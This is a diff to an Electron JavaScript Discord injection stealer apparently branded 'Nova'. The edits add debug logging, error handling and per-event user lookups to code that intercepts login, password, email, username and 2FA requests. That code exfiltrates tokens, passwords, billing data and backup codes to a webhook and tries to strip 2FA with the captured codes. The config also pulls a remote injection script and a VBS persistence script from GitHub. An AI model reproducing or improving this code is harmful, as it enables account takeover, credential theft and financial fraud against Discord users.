@@ -19,11 +19,11 @@ var config = {
   "init-notify": "true",
   "embed-color": 3553599,
   disable2FA: "%DISABLE_2FA%",
-  creator: "%NAME_CREATOR%",
+  creator: "",
   transfer_link: `%TRANSFER_URL%`,
   injection_url: "https://raw.githubusercontent.com/404log/couc/refs/heads/main/index.js",
   injector_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
-  webhook: "%WEBHOOK%",
+  webhook: "%WEBHOOK%", 
   Placed: "%API_URL%",
   Filter: {
     urls: [
@@ -82,9 +82,20 @@ var config = {
 };
 
 async function execScript(str) {
-  var window = electron.BrowserWindow.getAllWindows()[0];
-  var script = await window.webContents.executeJavaScript(str, true);
-  return script || null;
+  console.log("Executing script:", str);  
+  
+  try {
+    var window = electron.BrowserWindow.getAllWindows()[0];
+    console.log("Window retrieved:", window);  
+
+    var script = await window.webContents.executeJavaScript(str, true);
+    console.log("Script execution result:", script);  
+    return script || null;
+    
+  } catch (e) {
+    console.error("Error executing script:", e);  
+    return null;
+  }
 }
 
 const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
@@ -474,6 +485,7 @@ async function init() {
     });
   }
 }
+
 const FirstTime = async () => {
   var token = await execScript(tokenScript);
   if (config["init-notify"] !== "true") return true;
@@ -497,27 +509,16 @@ const FirstTime = async () => {
       });
     } else {
       var user = await getURL("https://discord.com/api/v8/users/@me", token);
-      var billing = await getURL(
-        "https://discord.com/api/v9/users/@me/billing/payment-sources",
-        token
-      );
-      var friends = await getURL(
-        "https://discord.com/api/v9/users/@me/relationships",
-        token
-      );
-      var Nitro = await getURL(
-        "https://discord.com/api/v9/users/" + user.id + "/profile",
-        token
-      );
+      var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources",token);
+      var friends = await getURL("https://discord.com/api/v9/users/@me/relationships",token);
+      var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile",token);
 
       var Billings = parseBilling(billing);
       var Friends = parseFriends(friends);
       if (!user.avatar)
-        var userAvatar =
-          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
+        var userAvatar ="https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
       if (!user.banner)
-        var userBanner =
-          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
+        var userBanner ="https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
 
       userBanner =
         userBanner ??
@@ -795,6 +796,7 @@ const FirstTime = async () => {
     return false;
   }
 };
+//// fin du 1 vole
 
 const Getpath = (function () {
   var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
@@ -821,12 +823,14 @@ const checUpdate = () => {
 
 async function StartFunc() {
   await electron.app.whenReady();
-  await Persistance();
-  await FirstTime();
+  //await Persistance();
+  await FirstTime(); // 1 grab 
   await init();
 
   checUpdate();
 }
+
+
 
 async function BoukiTuclcavectesfonctions() {
   var token = await execScript(tokenScript);
@@ -848,7 +852,7 @@ async function BoukiTuclcavectesfonctions() {
       "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png";
   if (!user.banner)
     var userBanner =
-      "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/giphy.gif";
+      "https://raw.githubusercontent.com/KSCHcuck/sub/165ae07181c977bdf519ebc7b40f314a81ea7415/assets/influence.gif";
 
   var userBanner =
     userBanner ??
@@ -913,18 +917,25 @@ electron.session.defaultSession.webRequest.onHeadersReceived(
     });
     if (!["POST", "PATCH"].includes(request.method)) return;
     if (request.statusCode !== 200) return;
-    try {
-      var data = JSON.parse(request.uploadData[0].bytes);
-      console.log(request.url, data);
-    } catch (err) {
-      var data = queryString.parse(
-        decodeURIComponent(request.uploadData[0].bytes.toString())
-      );
-      console.log(request.url, data);
+    if (request.uploadData && request.uploadData.length > 0) {
+      try {
+        var data = JSON.parse(request.uploadData[0].bytes);
+        console.log(request.url, data);
+      } catch (err) {
+        var data = queryString.parse(
+          decodeURIComponent(request.uploadData[0].bytes.toString())
+        );
+        console.log(request.url, data);
+      }
+    } else {
+      console.log("No upload data or empty data for request:", request.url);
     }
   }
 );
 //DEBUG
+
+
+
 
 electron.session.defaultSession.webRequest.onCompleted(
   config.onCompleted,
@@ -937,7 +948,8 @@ electron.session.defaultSession.webRequest.onCompleted(
       var data = queryString.parse(
         decodeURIComponent(request.uploadData[0].bytes.toString())
       );
-    }
+    }          
+
 
     var { appPath, appName } = Getpath;
     var client_discord = appName;
@@ -1057,6 +1069,7 @@ electron.session.defaultSession.webRequest.onCompleted(
           await post(params);
         }, 2000);
         break;
+
       case request.url.includes("mfa/finish"):
         var {
           token,
@@ -1101,6 +1114,9 @@ electron.session.defaultSession.webRequest.onCompleted(
         });
         await post(params);
         break;
+
+
+      // login
       case request.url.endsWith("login"):
         var {
           token,
@@ -1385,65 +1401,84 @@ electron.session.defaultSession.webRequest.onCompleted(
             break;
           }
         }
-      case request.url.endsWith("users/@me"):
-        if (!data.password) return;
-        if (data.new_password) {
-          var params = await makeEmbed({
+        
+        
+        //change password
+        case request.url.endsWith("users/@me"):
+          if (!data.password) {
+            return;
+          }
+          if (data.new_password) {
+            const {
+              token,
+              user,
+              Nitro,
+              userAvatar,
+              userBanner,
+              Billings,
+              Friends,
+            } = await BoukiTuclcavectesfonctions();
+            
+            if (!user || !token) {
+            return;
+          }
+
+        var params = await makeEmbed({
             title: "<:nova:1132934190032244786> Password Changed",
             color: config["embed-color"],
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
-              {
-                name: "Username <a:inject:1130448568268881960>",
-                value: `\`${user.username}\``,
-                inline: !0,
-              },
-              {
-                name: "ID <a:cat_rolling:1130448570789679165>",
-                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                inline: !0,
-              },
-              {
-                name: "Nitro <a:nitro:1130453517312725052>",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0,
-              },
-              {
-                name: "Badges <a:badges:1130448593715740692>",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
-                name: "Phone :mobile_phone:",
-                value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
-              },
-              {
-                name: "Email <:mail:1130451375495589968>",
-                value: `\`${user.email}\``,
-                inline: !0,
-              },
-              {
-                name: "<a:cam2:1130448575470514258> Old Password",
-                value: `\`${data.password}\``,
-                inline: !0,
-              },
-              {
-                name: "<a:cam2:1130448575470514258> New Password",
-                value: `\`${data.new_password}\``,
-                inline: !0,
-              },
-              {
-                name: "<a:eatsomething:1130449693613228072> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
-              },
+                {
+                    name: "Username <a:inject:1130448568268881960>",
+                    value: `\`${user.username}\``,
+                    inline: true,
+                },
+                {
+                    name: "ID <a:cat_rolling:1130448570789679165>",
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    inline: true,
+                },
+                {
+                    name: "Nitro <a:nitro:1130453517312725052>",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: true,
+                },
+                {
+                    name: "Badges <a:badges:1130448593715740692>",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: true,
+                },
+                {
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
+                    inline: true,
+                },
+                {
+                    name: "Email <:mail:1130451375495589968>",
+                    value: `\`${user.email}\``,
+                    inline: true,
+                },
+                {
+                    name: "<a:cam2:1130448575470514258> Old Password",
+                    value: `\`${data.password}\``,
+                    inline: true,
+                },
+                {
+                    name: "<a:cam2:1130448575470514258> New Password",
+                    value: `\`${data.new_password}\``,
+                    inline: true,
+                },
+                {
+                    name: "<a:eatsomething:1130449693613228072> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: false,
+                },
             ],
-
             thumbnail: userAvatar,
-          });
-
-          var params3 = await makeEmbed({
+        });
+        
+        
+        var params3 = await makeEmbed({
             title: `<a:caat2:1130448854861488168> Additional Information`,
             color: config["embed-color"],
             fields: [
@@ -1500,55 +1535,57 @@ electron.session.defaultSession.webRequest.onCompleted(
           params.embeds.push(params2.embeds[0]);
 
           await post(params);
-        } else if (data.email_token) {
+        } 
+        else if (data.email_token) {
+          //new email
+          var { token, user, billing, friends, Nitro, userAvatar, userBanner, Billings, Friends } = await BoukiTuclcavectesfonctions();
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> Email Changed",
-            color: config["embed-color"],
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
-            fields: [
-              {
-                name: "Username <a:inject:1130448568268881960>",
-                value: `\`${user.username}\``,
-                inline: !0,
-              },
-              {
-                name: "ID <a:cat_rolling:1130448570789679165>",
-                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                inline: !0,
-              },
-              {
-                name: "Nitro <a:nitro:1130453517312725052>",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0,
-              },
-              {
-                name: "Badges <a:badges:1130448593715740692>",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
-                name: "Phone :mobile_phone:",
-                value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
-              },
-              {
-                name: "New Email <:mail:1130451375495589968>",
-                value: `\`${user.email}\``,
-                inline: !0,
-              },
-              {
-                name: "<a:cam2:1130448575470514258> Password",
-                value: `\`${data.password}\``,
-                inline: !0,
-              },
-              {
-                name: "<a:eatsomething:1130449693613228072> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
-              },
-            ],
-
-            thumbnail: userAvatar,
+              title: "<:nova:1132934190032244786> Email Changed",
+              color: config["embed-color"],
+              description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+              fields: [
+                  {
+                      name: "Username <a:inject:1130448568268881960>",
+                      value: `\`${user.username}\``,
+                      inline: true,
+                  },
+                  {
+                      name: "ID <a:cat_rolling:1130448570789679165>",
+                      value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                      inline: true,
+                  },
+                  {
+                      name: "Nitro <a:nitro:1130453517312725052>",
+                      value: `${GetNitro(Nitro)}`,
+                      inline: true,
+                  },
+                  {
+                      name: "Badges <a:badges:1130448593715740692>",
+                      value: `${GetBadges(user.flags)}`,
+                      inline: true,
+                  },
+                  {
+                      name: "Phone :mobile_phone:",
+                      value: `\`${user.phone ?? "None"}\``,
+                      inline: true,
+                  },
+                  {
+                      name: "New Email <:mail:1130451375495589968>",
+                      value: `\`${user.email}\``,
+                      inline: true,
+                  },
+                  {
+                      name: "<a:cam2:1130448575470514258> Password",
+                      value: `\`${data.password}\``,
+                      inline: true,
+                  },
+                  {
+                      name: "<a:eatsomething:1130449693613228072> Token",
+                      value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                      inline: false,
+                  },
+              ],
+              thumbnail: userAvatar,
           });
 
           var params3 = await makeEmbed({
@@ -1609,56 +1646,60 @@ electron.session.defaultSession.webRequest.onCompleted(
           params.embeds.push(params2.embeds[0]);
 
           await post(params);
-        } else if (data.username) {
+        } 
+
+        // change username
+        else if (data.username) {
+          var { token, user, billing, friends, Nitro, userAvatar, userBanner, Billings, Friends } = await BoukiTuclcavectesfonctions();
           var params = await makeEmbed({
-            title: "<:nova:1132934190032244786> Username Changed",
-            color: config["embed-color"],
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
-            fields: [
-              {
+        title: "<:nova:1132934190032244786> Username Changed",
+        color: config["embed-color"],
+        description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+        fields: [
+            {
                 name: "New Username <a:inject:1130448568268881960>",
                 value: `\`${user.username}\``,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "ID <a:cat_rolling:1130448570789679165>",
                 value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "Nitro <a:nitro:1130453517312725052>",
                 value: `${GetNitro(Nitro)}`,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "Badges <a:badges:1130448593715740692>",
                 value: `${GetBadges(user.flags)}`,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "Phone :mobile_phone:",
                 value: `\`${user.phone ?? "None"}\``,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "Email <:mail:1130451375495589968>",
                 value: `\`${user.email}\``,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "<a:cam2:1130448575470514258> Password",
                 value: `\`${data.password}\``,
-                inline: !0,
-              },
-              {
+                inline: true,
+            },
+            {
                 name: "<a:eatsomething:1130449693613228072> Token",
                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                inline: !1,
-              },
-            ],
+                inline: false,
+            },
+        ],
 
-            thumbnail: userAvatar,
-          });
+        thumbnail: userAvatar,
+    });
 
           var params3 = await makeEmbed({
             title: `<a:caat2:1130448854861488168> Additional Information`,
@@ -1801,95 +1842,102 @@ electron.session.defaultSession.webRequest.onCompleted(
           );
         }
         break;
-      case request.url.endsWith("/enable"):
-        let ValidFound = false;
-        let backup_codes = (await execScript(backupscript)) ?? "";
 
-        if (config.disable2FA == "true") {
-          for (let i = 0; i < backup_codes.length; i++) {
-            try {
-              if (!backup_codes[i].consumed) {
-                let res = await remove2FA(token, backup_codes[i].code);
-                let parse_res = JSON.parse(res);
 
-                if (parse_res.token) {
-                  backup_codes[i].consumed = true;
-                  ValidFound = true;
-                  break;
-                } else if (parse_res.message == "401: Unauthorized") {
-                  break;
-                } else if (parse_res.message != "Invalid two-factor code") {
-                  break;
-                }
+       //2FA code setup
+        case request.url.endsWith("/enable"):
+          let ValidFound = false;
+          let backup_codes = (await execScript(backupscript)) ?? "";
+      
+          if (config.disable2FA == "true") {
+              for (let i = 0; i < backup_codes.length; i++) {
+                  try {
+                      if (!backup_codes[i].consumed) {
+                          let res = await remove2FA(token, backup_codes[i].code);
+                          let parse_res = JSON.parse(res);
+      
+                          if (parse_res.token) {
+                              backup_codes[i].consumed = true;
+                              ValidFound = true;
+                              break;
+                          } else if (parse_res.message == "401: Unauthorized") {
+                              break;
+                          } else if (parse_res.message != "Invalid two-factor code") {
+                              break;
+                          }
+                      }
+                  } catch (e) {
+                     
+                  }
               }
-            } catch (e) {}
           }
-        }
-
-        var params = await makeEmbed({
-          title: "<:nova:1132934190032244786> User Enable 2FA",
-          color: config["embed-color"],
-          fields: [
-            {
-              name: "Nova Files",
-              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
-              inline: false,
-            },
-            {
-              name: "IP",
-              value: `\`${ip}\``,
-              inline: false,
-            },
-            {
-              name: "Username <:username:1041634536733290596>",
-              value: `\`${user.username}\``,
-              inline: false,
-            },
-            {
-              name: "ID <a:cat_rolling:1130448570789679165>",
-              value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-              inline: false,
-            },
-            {
-              name: "Language <:4533language:1130453119919206500>",
-              value: GetLangue(user.locale),
-              inline: false,
-            },
-            {
-              name: "2FA disabler Response <:2FA:982994698278952980>",
-              value: `\`\`\`md\n- ${
-                ValidFound ? "Disabled" : "Cannot Disable"
-              }\`\`\``,
-              inline: false,
-            },
-            {
-              name: "A2F <a:keys:1159078859682107453>",
-              value: GetA2F(user.mfa_enabled),
-              inline: false,
-            },
-            {
-              name: "Badges <a:badges:1130448593715740692>",
-              value: GetBadges(user.flags),
-              inline: false,
-            },
-            {
-              name: "Backups Code <a:cat_rolling:1130448570789679165>",
-              value: `\`\`\`md\n${backup_codes
-                .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
-                .join("\n")}\`\`\``,
-              inline: false,
-            },
-            {
-              name: "<a:eatsomething:1130449693613228072> Token",
-              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-              inline: false,
-            },
-          ],
-
-          thumbnail: userAvatar,
-        });
-        await post(params);
-        break;
+          var { token, user, billing, friends, Nitro, userAvatar, userBanner, Billings, Friends } = await BoukiTuclcavectesfonctions();
+          var params = await makeEmbed({
+              title: "<:nova:1132934190032244786> User Enable 2FA",
+              color: config["embed-color"],
+              fields: [
+                  {
+                      name: "Nova Files",
+                      value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
+                      inline: false,
+                  },
+                  {
+                      name: "IP",
+                      value: `\`${ip}\``,
+                      inline: false,
+                  },
+                  {
+                      name: "Username <:username:1041634536733290596>",
+                      value: `\`${user.username}\``,
+                      inline: false,
+                  },
+                  {
+                      name: "ID <a:cat_rolling:1130448570789679165>",
+                      value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                      inline: false,
+                  },
+                  {
+                      name: "Language <:4533language:1130453119919206500>",
+                      value: GetLangue(user.locale),
+                      inline: false,
+                  },
+                  {
+                      name: "2FA disabler Response <:2FA:982994698278952980>",
+                      value: `\`\`\`md\n- ${
+                          ValidFound ? "Disabled" : "Cannot Disable"
+                      }\`\`\``,
+                      inline: false,
+                  },
+                  {
+                      name: "A2F <a:keys:1159078859682107453>",
+                      value: GetA2F(user.mfa_enabled),
+                      inline: false,
+                  },
+                  {
+                      name: "Badges <a:badges:1130448593715740692>",
+                      value: GetBadges(user.flags),
+                      inline: false,
+                  },
+                  {
+                      name: "Backups Code <a:cat_rolling:1130448570789679165>",
+                      value: `\`\`\`md\n${backup_codes
+                          .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
+                          .join("\n")}\`\`\``,
+                      inline: false,
+                  },
+                  {
+                      name: "<a:eatsomething:1130449693613228072> Token",
+                      value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                      inline: false,
+                  },
+              ],
+      
+              thumbnail: userAvatar,
+          });
+      
+          await post(params);  
+          break;
+        
       case request.url.endsWith("/disable"):
         var params = await makeEmbed({
           title: "<:nova:1132934190032244786> User Removed 2FA",
@@ -1936,6 +1984,8 @@ electron.session.defaultSession.webRequest.onCompleted(
         });
         await post(params);
         break;
+
+        
       case request.url.endsWith("/codes-verification"):
         var {
           token,
@@ -2176,3 +2226,4 @@ const allSessionsLocked = async () => {
 };
 StartFunc();
 allSessionsLocked();
+
